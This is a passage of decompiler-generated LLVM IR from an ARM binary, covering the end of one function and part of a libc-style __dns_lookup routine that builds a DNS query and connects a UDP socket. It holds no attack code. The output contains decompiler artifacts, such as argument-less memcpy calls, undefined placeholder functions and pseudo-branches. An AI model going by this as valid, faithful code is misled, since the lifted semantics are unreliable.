  %v1_2e4e059 = phi i32 [ %v1_2e4b4, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ %arg2, %dec_label_pc_2e4bc.preheader ]
  %v1_2e4cc = and i32 %v6_2e4bc63, 192
  br i1 %v2_2e56066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_2e4c8
  %v1_2e4d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_2e4d0 = add i32 %v1_2e4d0, 1
  store i32 %v2_2e4d0, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_2e4c8, %bb
  %v2_2e4d4 = icmp eq i32 %v1_2e4cc, 192
  %v1_2e4d8 = add i32 %v0_2e4d861, 1
  store i32 %v1_2e4d8, i32* %r1.global-to-local, align 4
  br i1 %v2_2e4d4, label %dec_label_pc_2e4e0, label %dec_label_pc_2e508

dec_label_pc_2e4e0:                               ; preds = %bb42
  %v6_2e4e4 = icmp slt i32 %v1_2e4d8, %v1_2e4e059
  br i1 %v6_2e4e4, label %dec_label_pc_2e4e8, label %dec_label_pc_2e574

dec_label_pc_2e4e8:                               ; preds = %dec_label_pc_2e4e0
  %v2_2e4e8 = add i32 %v1_2e4d8, %v0_2e4e862
  %v3_2e4e8 = inttoptr i32 %v2_2e4e8 to i8*
  %v4_2e4e8 = load i8, i8* %v3_2e4e8, align 1
  %v6_2e4e8 = zext i8 %v4_2e4e8 to i32
  %v1_2e4f0 = urem i32 %v6_2e4bc63, 64
  br i1 %v2_2e56066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_2e4e8
  %v1_2e4f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_2e4f4 = add i32 %v1_2e4f4, 1
  store i32 %v2_2e4f4, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_2e4e8, %bb43
  %v4_2e4f8 = mul nuw nsw i32 %v1_2e4f0, 256
  %v5_2e4f8 = or i32 %v6_2e4e8, %v4_2e4f8
  store i32 %v5_2e4f8, i32* %r1.global-to-local, align 4
  store i32 %v0_2e4fc60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_2e4b0

dec_label_pc_2e508:                               ; preds = %bb42
  %v2_2e508 = add i32 %v6_2e4bc63, %v0_2e4fc60
  store i32 %v2_2e508, i32* %r6.global-to-local, align 4
  %v3_2e50c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2e50c, i32* @r3, align 4
  %v1_2e510 = add i32 %v2_2e508, 1
  store i32 %v1_2e510, i32* %r7.global-to-local, align 4
  %v3_2e514 = icmp ult i32 %v1_2e510, %v3_2e50c
  br i1 %v3_2e514, label %dec_label_pc_2e51c, label %dec_label_pc_2e574

dec_label_pc_2e51c:                               ; preds = %dec_label_pc_2e508
  %v2_2e51c = add i32 %v6_2e4bc63, %v1_2e4d8
  store i32 %v2_2e51c, i32* @r5, align 4
  %v3_2e520 = icmp ult i32 %v2_2e51c, %v1_2e4e059
  br i1 %v3_2e520, label %dec_label_pc_2e528, label %dec_label_pc_2e574

dec_label_pc_2e528:                               ; preds = %dec_label_pc_2e51c
  %v2_2e528 = add i32 %v1_2e4d8, %v0_2e4e862
  store i32 %v2_2e528, i32* @r1, align 4
  %v0_2e52c = load i32, i32* %sb.global-to-local, align 4
  %v2_2e52c = add i32 %v0_2e52c, %v0_2e4fc60
  store i32 %v2_2e52c, i32* @r0, align 4
  store i32 %v6_2e4bc63, i32* @r2, align 4
  %v0_2e538 = call i32 @memcpy()
  store i32 %v0_2e538, i32* %r0.global-to-local, align 4
  store i32 %v0_2e56064, i32* @ip, align 4
  %v0_2e540 = load i32, i32* %sl.global-to-local, align 4
  %v1_2e540 = load i32, i32* @r5, align 4
  %v2_2e540 = add i32 %v1_2e540, %v0_2e540
  %v3_2e540 = inttoptr i32 %v2_2e540 to i8*
  %v4_2e540 = load i8, i8* %v3_2e540, align 1
  br i1 %v2_2e56066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_2e528
  %v1_2e548 = load i32, i32* %r8.global-to-local, align 4
  %v2_2e548 = load i32, i32* @r4, align 4
  %v3_2e548 = add i32 %v2_2e548, %v1_2e548
  store i32 %v3_2e548, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_2e528, %bb45
  %v2_2e54c = icmp eq i8 %v4_2e540, 0
  br i1 %v2_2e54c, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_2e558.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_2e540, i32* %r1.global-to-local, align 4
  %v2_2e558 = load i32, i32* %sb.global-to-local, align 4
  %v3_2e558 = load i32, i32* %r6.global-to-local, align 4
  %v4_2e558 = add i32 %v3_2e558, %v2_2e558
  %v5_2e558 = inttoptr i32 %v4_2e558 to i8*
  store i8 %v0_2e558.off0, i8* %v5_2e558, align 1
  %v0_2e4b0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_2e4b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_2e4b4.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2e4b0

dec_label_pc_2e560:                               ; preds = %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge
  %v0_2e568.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_2e560, label %dec_label_pc_2e574, label %bb49

bb49:                                             ; preds = %dec_label_pc_2e4bc.preheader, %dec_label_pc_2e560
  %v0_2e568.pre69 = phi i32 [ %v0_2e568.pre.pre, %dec_label_pc_2e560 ], [ 0, %dec_label_pc_2e4bc.preheader ]
  %v2_2e564 = add i32 %v0_2e568.pre69, 1
  store i32 %v2_2e564, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2e574

dec_label_pc_2e574:                               ; preds = %dec_label_pc_2e51c, %dec_label_pc_2e508, %dec_label_pc_2e4e0, %dec_label_pc_2e4b0, %dec_label_pc_2e560, %dec_label_pc_2e4b4.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_2e564, %bb49 ], [ -1, %dec_label_pc_2e4b4.preheader ], [ %v0_2e568.pre.pre, %dec_label_pc_2e560 ], [ -1, %dec_label_pc_2e508 ], [ -1, %dec_label_pc_2e51c ], [ -1, %dec_label_pc_2e4b0 ], [ -1, %dec_label_pc_2e4e0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_2e488, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2e568.pre.pre, { 1, 0 }
  uselistorder i32 %v1_2e540, { 1, 0 }
  uselistorder i32 %v5_2e4f8, { 1, 0 }
  uselistorder i32 %v1_2e4d8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_2e4fc60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_2e4bc63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_2e56066, { 1, 2, 0 }
  uselistorder i32 %v0_2e48c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_2e574, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_2e4c8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %tmp163 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp176 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_2e580 = load i32, i32* @r4, align 4
  %v6_2e580 = load i32, i32* @r5, align 4
  %v9_2e580 = load i32, i32* @r6, align 4
  %v12_2e580 = load i32, i32* @r7, align 4
  %v15_2e580 = load i32, i32* @r8, align 4
  %v18_2e580 = load i32, i32* @sb, align 4
  %v21_2e580 = load i32, i32* @sl, align 4
  %v24_2e580 = load i32, i32* @fp, align 4
  %v27_2e580 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @sb, align 4
  %v0_2e594 = load i32, i32* %r1.global-to-local, align 4
  %v1_2e59c = call i32 @malloc(i32 512)
  store i32 %v1_2e59c, i32* @sl, align 4
  %v0_2e5a4 = load i32, i32* @r4, align 4
  %v1_2e5a4 = inttoptr i32 %v0_2e5a4 to i8*
  %v3_2e5a8 = call i32 @strlen(i8* %v1_2e5a4)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_2e5b4 = icmp ugt i32 %v3_2e5a8, 893
  store i1 %v3_2e5b4, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r8, align 4
  %tmp288 = icmp ugt i32 %v3_2e5a8, 894
  br i1 %tmp288, label %.thread134, label %dec_label_pc_2e5d4

.thread134:                                       ; preds = %entry
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2ecf8

dec_label_pc_2e5d4:                               ; preds = %entry
  store i32 %v3_2e5a8, i32* %r2.global-to-local, align 4
  %v1_2e5d8 = add i32 %v3_2e5a8, 130
  %v1_2e5dc = call i32 @malloc(i32 %v1_2e5d8)
  store i32 %v1_2e5dc, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2e5e0 = icmp eq i32 %v1_2e5dc, 0
  br i1 %v2_2e5e0, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_2e5d4
  %v1_2e5e4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_2e5e4 = icmp eq i32 %v1_2e5e4, 0
  br i1 %v3_2e5e4, label %bb217, label %dec_label_pc_2e5f8

.thread6:                                         ; preds = %dec_label_pc_2e5d4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_2ecf0

bb217:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_2ecf0

dec_label_pc_2e5f8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_2e5f8 = load i32, i32* @r4, align 4
  %v1_2e5f8 = inttoptr i32 %v0_2e5f8 to i8*
  %v2_2e5f8 = load i8, i8* %v1_2e5f8, align 1
  %v3_2e5f8 = zext i8 %v2_2e5f8 to i32
  store i32 %v3_2e5f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2e5fc = icmp eq i8 %v2_2e5f8, 0
  br i1 %v2_2e5fc, label %dec_label_pc_2ecf0, label %dec_label_pc_2e604

dec_label_pc_2e604:                               ; preds = %dec_label_pc_2e5f8
  %v2_2e608 = add i32 %v0_2e5f8, %v3_2e5a8
  store i32 %v2_2e608, i32* %r3.global-to-local, align 4
  %v1_2e60c = add i32 %v2_2e608, -1
  %v2_2e60c = inttoptr i32 %v1_2e60c to i8*
  %v3_2e60c = load i8, i8* %v2_2e60c, align 1
  %v4_2e60c = zext i8 %v3_2e60c to i32
  store i32 %v4_2e60c, i32* @r3, align 4
  store i32 %v3_2e5a8, i32* @r2, align 4
  store i32 %v0_2e5f8, i32* @r1, align 4
  %v0_2e61c = call i32 @memcpy()
  store i32 29912, i32* %r3.global-to-local, align 4
  store i32 28816, i32* %r1.global-to-local, align 4
  store i32 879, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v2_2e694 = ptrtoint i32* %stack_var_-76 to i32
  %v2_2e7a4 = ptrtoint i16* %stack_var_-104 to i32
  %v2_2e7cc = ptrtoint i32* %stack_var_-192 to i32
  %v3_2e7ec = bitcast i32* %stack_var_-192 to i8*
  %v2_2e8a0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_2e938 = icmp eq i32 %tmp165, 0
  %v1_2e944 = add i32 %tmp164, -2
  %v2_2e948 = icmp ne i32 %v1_2e944, 0
  %tmp218 = icmp slt i32 %tmp163, 1
  %v2_2ea44 = ptrtoint i32* %stack_var_-448 to i32
  %v2_2ea48 = ptrtoint i32* %stack_var_-144 to i32
  %v5_2ec9c57 = icmp sgt i32 %tmp163, 0
  %v2_2ebc4 = icmp ne i32 %v0_2e594, 0
  %v7_2ebc4 = icmp eq i32 %v0_2e594, 1
  %v1_2eaac = bitcast i32* %stack_var_-448 to i8*
  %v2_2eb60 = icmp eq i32 %tmp148, 0
  %v2_2e954 = icmp ugt i8 %v3_2e60c, 45
  %v7_2e954 = icmp eq i8 %v3_2e60c, 46
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_2e6e8 = add i32 %v1_2e5dc, %v3_2e5a8
  %v5_2e6e8 = inttoptr i32 %v4_2e6e8 to i8*
  %v1_2e944.cmp = icmp ugt i32 %v1_2e944, 1
  %v2_2e984 = icmp eq i32 %tmp164, 0
  %v3_2ebc8 = icmp ugt i32 %v0_2e594, 27
  %v8_2ebc8 = icmp eq i32 %v0_2e594, 28
  br label %dec_label_pc_2e678

dec_label_pc_2e678:                               ; preds = %dec_label_pc_2ecd8, %dec_label_pc_2e604
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_2e604 ], [ %v1_2ecdc, %dec_label_pc_2ecd8 ]
  %stack_var_-464.0 = phi i32 [ %tmp176, %dec_label_pc_2e604 ], [ %v3_2e784, %dec_label_pc_2ecd8 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_2e604 ], [ %stack_var_-468.2, %dec_label_pc_2ecd8 ]
  %v1_2e680 = phi i32 [ -1, %dec_label_pc_2e604 ], [ %v3_2e858, %dec_label_pc_2ecd8 ]
  store i32 %v1_2e680, i32* %r3.global-to-local, align 4
  %v2_2e67c = icmp eq i32 %v1_2e680, -1
  store i1 %v2_2e67c, i1* %cpsr_c.global-to-local, align 1
  %v7_2e67c = icmp eq i32 %v1_2e680, -1
  br i1 %v7_2e67c, label %bb220, label %bb219

bb219:                                            ; preds = %dec_label_pc_2e678
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_2e678, %bb219
  %v1_2e684 = xor i1 %v7_2e67c, true
  call void @__pseudo_cond_branch(i1 %v1_2e684, i32 ptrtoint (i32* @global_var_28300.3552 to i32))
  %v0_2e690 = load i32, i32* @r8, align 4
  %v2_2e690 = add i32 %v0_2e690, 80
  %v3_2e690 = inttoptr i32 %v2_2e690 to i32*
  %v4_2e690 = load i32, i32* %v3_2e690, align 4
  store i32 %v4_2e690, i32* @r4, align 4
  store i32 %v2_2e694, i32* @r5, align 4
  %v2_2e698 = add i32 %v0_2e690, 76
  %v3_2e698 = inttoptr i32 %v2_2e698 to i32*
  %v4_2e698 = load i32, i32* %v3_2e698, align 4
  store i32 %v4_2e698, i32* %r1.global-to-local, align 4
  store i32 %v4_2e690, i32* %r2.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v2_2e6a8 = add i32 %v0_2e690, 124
  %v3_2e6a8 = inttoptr i32 %v2_2e6a8 to i32*
  %v4_2e6a8 = load i32, i32* %v3_2e6a8, align 4
  call void @__pseudo_branch(i32 %v4_2e6a8)
  %v0_2e6bc = load i32, i32* @r8, align 4
  %v2_2e6bc = add i32 %v0_2e6bc, 20
  %v3_2e6bc = inttoptr i32 %v2_2e6bc to i32*
  %v4_2e6bc = load i32, i32* %v3_2e6bc, align 4
  store i32 190152, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2e6bc)
  %v0_2e6c8 = call i32 @__open_nameservers()
  %v0_2e6d0 = load i32, i32* @r8, align 4
  %v2_2e6d0 = add i32 %v0_2e6d0, 29912
  %v3_2e6d0 = inttoptr i32 %v2_2e6d0 to i32*
  %v4_2e6d0 = load i32, i32* %v3_2e6d0, align 4
  store i32 %v1_2e5dc, i32* %r1.global-to-local, align 4
  store i32 %v3_2e5a8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_2e6e0 = load i32, i32* @r7, align 4
  %v3_2e6e0 = icmp uge i32 %v0_2e6e0, %v4_2e6d0
  store i1 %v3_2e6e0, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_2e6e8, align 1
  %v0_2e6ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2e6ec, label %dec_label_pc_2e710, label %dec_label_pc_2e6f0

dec_label_pc_2e6f0:                               ; preds = %bb220
  store i32 46, i32* %r3.global-to-local, align 4
  %v2_2e6f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_2e6f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_2e6f4 = add i32 %v3_2e6f4, %v2_2e6f4
  %v5_2e6f4 = inttoptr i32 %v4_2e6f4 to i8*
  store i8 46, i8* %v5_2e6f4, align 1
  %v0_2e6fc = load i32, i32* @r8, align 4
  %v2_2e6fc = add i32 %v0_2e6fc, 29900
  %v3_2e6fc = inttoptr i32 %v2_2e6fc to i32*
  %v4_2e6fc = load i32, i32* %v3_2e6fc, align 4
  store i32 %v4_2e6fc, i32* %r3.global-to-local, align 4
  %v0_2e700 = load i32, i32* %r1.global-to-local, align 4
  %v1_2e700 = add i32 %v0_2e700, 1
  %v1_2e704 = load i32, i32* %r2.global-to-local, align 4
  %v2_2e704 = add i32 %v1_2e700, %v1_2e704
  %v1_2e708 = load i32, i32* @r7, align 4
  %v2_2e708 = and i32 %v1_2e708, 1073741824
  %v3_2e708 = icmp ne i32 %v2_2e708, 0
  store i1 %v3_2e708, i1* %cpsr_c.global-to-local, align 1
  %v4_2e708 = mul i32 %v1_2e708, 4
  %v5_2e708 = add i32 %v4_2e708, %v4_2e6fc
  %v6_2e708 = inttoptr i32 %v5_2e708 to i32*
  %v7_2e708 = load i32, i32* %v6_2e708, align 4
  store i32 %v7_2e708, i32* @r1, align 4
  %v2_2e70c = inttoptr i32 %v2_2e704 to i8*
  %v3_2e70c = call i32 @strcpy(i8* %v2_2e70c, i32 %v7_2e708)
  br label %dec_label_pc_2e710

dec_label_pc_2e710:                               ; preds = %bb220, %dec_label_pc_2e6f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e714 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_2e714, label %dec_label_pc_2e71c, label %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge

dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge:  ; preds = %dec_label_pc_2e710
  %v0_2e754.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_2e74c

dec_label_pc_2e71c:                               ; preds = %dec_label_pc_2e710
  store i32 29908, i32* %r3.global-to-local, align 4
  store i32 879, i32* %r1.global-to-local, align 4
  %v0_2e724 = load i32, i32* @r8, align 4
  %v2_2e724 = add i32 %v0_2e724, 29908
  %v3_2e724 = inttoptr i32 %v2_2e724 to i32*
  %v4_2e724 = load i32, i32* %v3_2e724, align 4
  store i32 %v4_2e724, i32* %r2.global-to-local, align 4
  %v2_2e728 = add i32 %v0_2e724, 879
  %v3_2e728 = inttoptr i32 %v2_2e728 to i8*
  %v4_2e728 = load i8, i8* %v3_2e728, align 1
  %v6_2e728 = zext i8 %v4_2e728 to i32
  %v2_2e72c = mul i32 %v6_2e728, %v4_2e724
  store i32 876, i32* %r2.global-to-local, align 4
  store i32 28816, i32* %r3.global-to-local, align 4
  %v2_2e73c = add i32 %v0_2e724, 876
  %v3_2e73c = inttoptr i32 %v2_2e73c to i16*
  %v4_2e73c = load i16, i16* %v3_2e73c, align 2
  %v6_2e73c = zext i16 %v4_2e73c to i32
  store i32 %v6_2e73c, i32* %r2.global-to-local, align 4
  %v2_2e740 = add i32 %v0_2e724, 28816
  %v3_2e740 = inttoptr i32 %v2_2e740 to i32*
  %v4_2e740 = load i32, i32* %v3_2e740, align 4
  store i32 %v4_2e740, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2e74c

dec_label_pc_2e74c:                               ; preds = %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge, %dec_label_pc_2e71c
  %v2_2e790 = phi i32 [ %v0_2e724, %dec_label_pc_2e71c ], [ %v0_2e754.pre, %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_2e73c, %dec_label_pc_2e71c ], [ %stack_var_-464.0, %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_2e740, %dec_label_pc_2e71c ], [ %stack_var_-468.0, %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_2e72c, %dec_label_pc_2e71c ], [ %stack_var_-476.0, %dec_label_pc_2e710.dec_label_pc_2e74c_crit_edge ]
  store i32 29908, i32* %r3.global-to-local, align 4
  %v2_2e754 = add i32 %v2_2e790, 29908
  %v3_2e754 = inttoptr i32 %v2_2e754 to i32*
  %v4_2e754 = load i32, i32* %v3_2e754, align 4
  store i32 %v4_2e754, i32* %r2.global-to-local, align 4
  store i32 29904, i32* %r3.global-to-local, align 4
  %v3_2e75c = icmp uge i32 %stack_var_-468.1, %v4_2e754
  store i1 %v3_2e75c, i1* %cpsr_c.global-to-local, align 1
  %v2_2e760 = add i32 %v2_2e790, 29904
  %v3_2e760 = inttoptr i32 %v2_2e760 to i32*
  %v4_2e760 = load i32, i32* %v3_2e760, align 4
  store i32 %v4_2e760, i32* %r3.global-to-local, align 4
  br i1 %v3_2e75c, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_2e74c
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_2e74c, %bb221
  %v0_2e76c = phi i32 [ %stack_var_-468.1, %dec_label_pc_2e74c ], [ 0, %bb221 ]
  %v3_2e76c = mul i32 %v0_2e76c, 28
  %v4_2e76c = add i32 %v3_2e76c, %v4_2e760
  store i32 %v4_2e76c, i32* %r3.global-to-local, align 4
  %v1_2e778 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_2e784 = urem i32 %v1_2e778, 65536
  store i32 28816, i32* %r1.global-to-local, align 4
  %v1_2e790 = trunc i32 %v1_2e778 to i16
  %v4_2e790 = add i32 %v2_2e790, 876
  %v5_2e790 = inttoptr i32 %v4_2e790 to i16*
  store i16 %v1_2e790, i16* %v5_2e790, align 2
  store i32 %v0_2e76c, i32* %r2.global-to-local, align 4
  %v1_2e798 = load i32, i32* @r8, align 4
  %v2_2e798 = load i32, i32* %r1.global-to-local, align 4
  %v3_2e798 = add i32 %v2_2e798, %v1_2e798
  %v4_2e798 = inttoptr i32 %v3_2e798 to i32*
  store i32 %v0_2e76c, i32* %v4_2e798, align 4
  %v0_2e79c = load i32, i32* %r3.global-to-local, align 4
  %v1_2e7a0 = inttoptr i32 %v0_2e79c to i32*
  %v2_2e7a0 = load i32, i32* %v1_2e7a0, align 4
  %v3_2e7a0 = add i32 %v0_2e79c, 4
  %v4_2e7a0 = inttoptr i32 %v3_2e7a0 to i32*
  %v5_2e7a0 = load i32, i32* %v4_2e7a0, align 4
  store i32 %v5_2e7a0, i32* %r1.global-to-local, align 4
  %v6_2e7a0 = add i32 %v0_2e79c, 8
  %v7_2e7a0 = inttoptr i32 %v6_2e7a0 to i32*
  %v8_2e7a0 = load i32, i32* %v7_2e7a0, align 4
  store i32 %v8_2e7a0, i32* %r2.global-to-local, align 4
  %v9_2e7a0 = add i32 %v0_2e79c, 12
  %v10_2e7a0 = inttoptr i32 %v9_2e7a0 to i32*
  %v11_2e7a0 = load i32, i32* %v10_2e7a0, align 4
  store i32 %v11_2e7a0, i32* %r3.global-to-local, align 4
  %v4_2e7a8 = trunc i32 %v2_2e7a0 to i16
  store i16 %v4_2e7a8, i16* %stack_var_-104, align 2
  %v3_2e7ac = add i32 %v0_2e79c, 20
  %v4_2e7ac = inttoptr i32 %v3_2e7ac to i32*
  %v5_2e7ac = load i32, i32* %v4_2e7ac, align 4
  store i32 %v5_2e7ac, i32* %r1.global-to-local, align 4
  %v6_2e7ac = add i32 %v0_2e79c, 24
  %v7_2e7ac = inttoptr i32 %v6_2e7ac to i32*
  %v8_2e7ac = load i32, i32* %v7_2e7ac, align 4
  store i32 %v8_2e7ac, i32* %r2.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_2e7c0 = load i32, i32* @r8, align 4
  %v2_2e7c0 = add i32 %v0_2e7c0, 52
  %v3_2e7c0 = inttoptr i32 %v2_2e7c0 to i32*
  %v4_2e7c0 = load i32, i32* %v3_2e7c0, align 4
  store i32 190412, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2e7c0)
  store i32 %v2_2e7cc, i32* @r6, align 4
  %v0_2e7d0 = load i32, i32* @fp, align 4
  store i32 %v0_2e7d0, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  %v0_2e7d8 = load i32, i32* @sl, align 4
  %v3_2e7dc = inttoptr i32 %v0_2e7d8 to i8*
  %v4_2e7dc = call i32 @__GI_memset(i8* %v3_2e7dc, i32 %v0_2e7d0, i32 512)
  %v0_2e7e0 = load i32, i32* @fp, align 4
  store i32 %v0_2e7e0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v4_2e7ec = call i32 @__GI_memset(i8* %v3_2e7ec, i32 %v0_2e7e0, i32 48)
  store i32 %v3_2e784, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_2e7fc = load i32, i32* @sl, align 4
  store i32 %v0_2e7fc, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 %v3_2e784, i32* %stack_var_-192, align 4
  %v6_2e810 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_2e7fc, i32 512, i32 %v3_2e784, i32 %v3_2e784)
  store i32 %v6_2e810, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e814 = icmp slt i32 %v6_2e810, 0
  br i1 %v1_2e814, label %dec_label_pc_2ecf0, label %dec_label_pc_2e81c

dec_label_pc_2e81c:                               ; preds = %bb222
  store i32 %v0_2e594, i32* @ip, align 4
  store i32 %v1_2e5dc, i32* @r5, align 4
  %v0_2e82c = load i32, i32* @sl, align 4
  %v2_2e82c = add i32 %v0_2e82c, %v6_2e810
  store i32 %v2_2e82c, i32* %r1.global-to-local, align 4
  %v1_2e830 = sub i32 512, %v6_2e810
  store i32 %v1_2e830, i32* %r2.global-to-local, align 4
  store i32 %v1_2e5dc, i32* %stack_var_-60, align 4
  %v4_2e83c = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_2e82c, i32 %v1_2e830)
  store i32 %v4_2e83c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e840 = icmp slt i32 %v4_2e83c, 0
  br i1 %v1_2e840, label %dec_label_pc_2ecf0, label %dec_label_pc_2e848

dec_label_pc_2e848:                               ; preds = %dec_label_pc_2e81c
  %v3_2e84c = load i16, i16* %stack_var_-104, align 2
  %v4_2e84c = sext i16 %v3_2e84c to i32
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_2e858 = call i32 @socket(i32 %v4_2e84c, i32 2, i32 17)
  store i32 %v3_2e858, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e85c = icmp slt i32 %v3_2e858, 0
  br i1 %v1_2e85c, label %dec_label_pc_2ecc8, label %dec_label_pc_2e868

dec_label_pc_2e868:                               ; preds = %dec_label_pc_2e848
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_2e7a4, i32* %r1.global-to-local, align 4
  %v3_2e870 = call i32 @__libc_connect(i32 %v3_2e858, i32 %v2_2e7a4, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e874 = icmp slt i32 %v3_2e870, 0
  br i1 %v1_2e874, label %dec_label_pc_2ecc8, label %dec_label_pc_2e87c

dec_label_pc_2e87c:                               ; preds = %dec_label_pc_2e868
  %v0_2e87c = load i32, i32* @r5, align 4
  %v1_2e87c = load i32, i32* @r4, align 4
  %v2_2e87c = add i32 %v1_2e87c, %v0_2e87c
  store i32 %v2_2e87c, i32* %r2.global-to-local, align 4
  %v0_2e880 = load i32, i32* @fp, align 4
  store i32 %v0_2e880, i32* %r3.global-to-local, align 4
